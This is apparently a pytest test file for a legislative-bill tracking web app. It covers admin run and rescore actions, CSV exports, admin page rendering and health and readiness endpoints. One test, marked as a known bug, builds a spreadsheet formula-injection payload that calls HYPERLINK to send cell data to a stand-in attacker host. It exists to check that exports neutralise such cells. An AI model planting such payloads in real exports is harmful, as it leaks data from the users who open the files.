"""QA (stream 3): admin actions (Run now, Rescore all), CSV exports, /health and /ready.

Spec: docs/build-prompt.md sections 6.4 and 8; docs/architecture.md sections 4 and 5.
"""

from __future__ import annotations

import csv
import io
from collections.abc import Iterator

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.orm import Session

from lexwatch.db import get_db
from lexwatch.models import Profile, Run
from lexwatch.web.app import create_app
from tests.helpers import csrf_token, make_test_settings
from tests.web.factories import dev_user, make_bill, make_match, make_profile, other_user

FORMULA_PREFIXES = ("=", "+", "-", "@")


def _client_for(db: Session, **overrides: object) -> TestClient:
    application = create_app(make_test_settings(**overrides))

    def _get_db() -> Iterator[Session]:
        yield db

    application.dependency_overrides[get_db] = _get_db
    return TestClient(application)


def runs(db: Session) -> list[Run]:
    db.expire_all()
    return list(db.scalars(select(Run).order_by(Run.id)))


# --- Run now ------------------------------------------------------------------------------


def test_run_now_creates_exactly_one_queued_manual_run(admin_client, db):
    admin = dev_user(db, "admin")
    token = csrf_token(admin_client)
    response = admin_client.post("/admin/run", data={"csrf_token": token}, follow_redirects=False)
    assert response.status_code == 303
    assert response.headers["location"] == "/admin"
    created = runs(db)
    assert len(created) == 1
    run = created[0]
    assert (run.kind, run.status, run.requested_by) == ("manual", "queued", admin.id)
    assert run.started_at is None and run.finished_at is None


def test_run_now_double_submit_creates_one_run(admin_client, db):
    token = csrf_token(admin_client)
    for _ in range(3):
        admin_client.post("/admin/run", data={"csrf_token": token})
    assert len(runs(db)) == 1


def test_run_now_allowed_again_after_queued_run_finished(admin_client, db):
    token = csrf_token(admin_client)
    admin_client.post("/admin/run", data={"csrf_token": token})
    first = runs(db)[0]
    first.status = "success"
    db.flush()
    admin_client.post("/admin/run", data={"csrf_token": token})
    assert [r.status for r in runs(db)] == ["success", "queued"]


def test_run_now_via_htmx_header_token(admin_client, db):
    token = csrf_token(admin_client)
    response = admin_client.post(
        "/admin/run", headers={"X-CSRF-Token": token}, follow_redirects=False
    )
    assert response.status_code == 303
    assert len(runs(db)) == 1


def test_queued_run_is_shown_on_admin_page(admin_client, db):
    admin_client.post("/admin/run", data={"csrf_token": csrf_token(admin_client)})
    page = admin_client.get("/admin").text
    assert "En attente" in page or "queued" in page.lower()


# --- Rescore all --------------------------------------------------------------------------


def test_rescore_all_marks_every_profile_pending(admin_client, db):
    admin = dev_user(db, "admin")
    profiles = [
        make_profile(db, admin, name="A"),
        make_profile(db, other_user(db, "u1"), name="B"),
        make_profile(db, other_user(db, "u2"), name="C", rules=()),
    ]
    response = admin_client.post(
        "/admin/rescore", data={"csrf_token": csrf_token(admin_client)}, follow_redirects=False
    )
    assert response.status_code == 303
    db.expire_all()
    for profile in profiles:
        assert db.get(Profile, profile.id).rescore_status in ("pending", "running")
    # Rescore all does not create runs of its own (the worker picks up pending profiles).
    assert runs(db) == [] or all(r.kind == "rescore" for r in runs(db))


def test_rescore_all_does_not_reset_running_profile(admin_client, db):
    profile = make_profile(db, dev_user(db, "admin"), name="Busy")
    profile.rescore_status = "running"
    db.flush()
    admin_client.post("/admin/rescore", data={"csrf_token": csrf_token(admin_client)})
    db.expire_all()
    assert db.get(Profile, profile.id).rescore_status in ("running", "pending")


def test_rescore_all_with_no_profiles(admin_client, db):
    response = admin_client.post(
        "/admin/rescore", data={"csrf_token": csrf_token(admin_client)}, follow_redirects=False
    )
    assert response.status_code == 303


# --- CSV exports --------------------------------------------------------------------------


def _csv(response) -> list[list[str]]:
    assert response.status_code == 200
    assert response.headers["content-type"].startswith("text/csv")
    assert "charset=utf-8" in response.headers["content-type"].lower()
    assert response.content.startswith(b"\xef\xbb\xbf"), "missing UTF-8 BOM"
    assert response.content.count(b"\xef\xbb\xbf") == 1
    disposition = response.headers.get("content-disposition", "")
    assert disposition.startswith("attachment")
    assert ".csv" in disposition
    text = response.content.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(text)))


def test_bills_csv_headers_bom_and_rows(admin_client, db):
    make_bill(db, "8410", title="Loi sur la pêche, « accents » et virgules")
    rows = _csv(admin_client.get("/admin/export/bills.csv"))
    header, *body = rows
    assert header[0] == "number"
    assert "title" in header
    assert len(body) == 1
    assert body[0][header.index("title")] == "Loi sur la pêche, « accents » et virgules"


def test_bills_csv_empty_database_has_header_only(admin_client):
    rows = _csv(admin_client.get("/admin/export/bills.csv"))
    assert len(rows) == 1


def test_matches_csv_headers_bom_and_rows(admin_client, db):
    profile = make_profile(db, other_user(db, "u3"), name="Profil fiscal")
    bill = make_bill(db, "8411")
    make_match(db, profile, bill, 0.734)
    rows = _csv(admin_client.get("/admin/export/matches.csv"))
    header, *body = rows
    assert len(body) == 1
    row = dict(zip(header, body[0], strict=True))
    assert row["bill_number"] == "8411"
    assert "Profil fiscal" in body[0]
    assert any(cell.startswith("0.73") for cell in body[0])


def test_csv_export_is_not_html(admin_client):
    response = admin_client.get("/admin/export/bills.csv")
    assert "<html" not in response.text


def test_csv_newlines_in_cells_are_quoted(admin_client, db):
    make_bill(db, "8412", title='ligne 1\nligne 2 "citée"')
    rows = _csv(admin_client.get("/admin/export/bills.csv"))
    header, body = rows[0], rows[1:]
    assert len(body) == 1
    assert body[0][header.index("title")] == 'ligne 1\nligne 2 "citée"'


@pytest.mark.xfail(
    strict=True,
    reason="BUG: CSV formula injection: bill titles (public source data) and profile names "
    "(user input) starting with = + - @ are exported as-is, so Excel evaluates them. "
    "Expected: such cells neutralized (e.g. prefixed with an apostrophe).",
)
@pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
def test_csv_cells_are_protected_against_formula_injection(admin_client, db, prefix):
    payload = f'{prefix}HYPERLINK("https://evil.example/?x="&A1,"click")'
    profile = make_profile(db, other_user(db, "u4"), name=payload)
    bill = make_bill(db, "8413", title=payload, author=payload)
    make_match(db, profile, bill, 0.9)
    for path in ("/admin/export/bills.csv", "/admin/export/matches.csv"):
        rows = _csv(admin_client.get(path))
        cells = [cell for row in rows[1:] for cell in row]
        assert any("HYPERLINK" in cell for cell in cells), path
        for cell in cells:
            assert not cell.startswith(FORMULA_PREFIXES), (path, cell)


def test_admin_page_links_to_both_exports(admin_client):
    page = admin_client.get("/admin").text
    assert 'href="/admin/export/bills.csv"' in page
    assert 'href="/admin/export/matches.csv"' in page


# --- admin page content -------------------------------------------------------------------


def test_admin_page_shows_run_time_duration_counts_and_errors(admin_client, db):
    from datetime import UTC, datetime, timedelta

    start = datetime.now(UTC) - timedelta(hours=1)
    run = Run(
        kind="daily",
        status="partial",
        started_at=start,
        finished_at=start + timedelta(seconds=75),
        bills_added=7,
        bills_changed=3,
        bills_scored=10,
        bills_unscored=1,
        billed_units=1234,
        error_message="chd: <b>timeout</b>",
    )
    db.add(run)
    db.flush()
    page = admin_client.get("/admin").text
    assert "1 min 15 s" in page
    for value in ("7", "3", "1234"):
        assert f">{value}<" in page
    assert "&lt;b&gt;timeout&lt;/b&gt;" in page
    assert "<b>timeout</b>" not in page


# --- health and readiness -----------------------------------------------------------------


def test_health_needs_no_auth_and_no_db(db):
    with _client_for(db, dev_auth=False) as c:
        response = c.get("/health")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_ready_ok_with_db_and_scorer(db):
    with _client_for(db, dev_auth=False) as c:
        response = c.get("/ready")
    assert response.status_code == 200
    body = response.json()
    assert body["status"] == "ok"
    assert body.get("database") is True and body.get("scorer") is True


def test_ready_503_when_scorer_not_configured(db):
    with _client_for(db, dev_auth=False, scorer="foundry", foundry_endpoint="") as c:
        response = c.get("/ready")
    assert response.status_code == 503
    assert response.json()["scorer"] is False


def test_ready_does_not_build_or_call_the_scorer(db, monkeypatch):
    import lexwatch.scoring.factory as factory

    def boom(*args, **kwargs):
        raise AssertionError("/ready must not build a scorer or call the paid endpoint")

    monkeypatch.setattr(factory, "get_scorer", boom)
    with _client_for(
        db, dev_auth=False, scorer="foundry", foundry_endpoint="https://example.invalid"
    ) as c:
        response = c.get("/ready")
    assert response.status_code == 200


def test_ready_503_when_database_unreachable():
    settings = make_test_settings(
        dev_auth=False,
        database_url="postgresql+psycopg://nobody:nothing@127.0.0.1:1/none?connect_timeout=1",
    )
    with TestClient(create_app(settings)) as c:
        response = c.get("/ready")
    assert response.status_code == 503
    assert response.json()["database"] is False
